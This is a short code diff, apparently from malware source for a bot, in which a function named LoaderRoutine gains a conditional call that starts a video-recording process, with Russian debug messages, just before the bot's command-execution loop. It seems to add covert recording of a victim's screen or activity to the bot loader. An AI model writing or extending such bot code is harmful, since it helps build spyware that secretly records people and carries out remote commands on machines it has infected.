@@ -113,7 +113,14 @@ DWORD WINAPI LoaderRoutine(LPVOID Data)
 
 
 	bool FirstSended = false;
-	
+
+	#ifdef VideoRecorderH
+		if( VideoProcess::Start() )
+			DLLDBG( "Main", "Запустили видео процесс" );
+		else
+			DLLDBG( "Main", "ERROR: не запустился видео процесс" );
+	#endif
+
 	DLLDBG("====>Bot Loader", "Стартуем выполнение команд");
 	while (true)
 	{
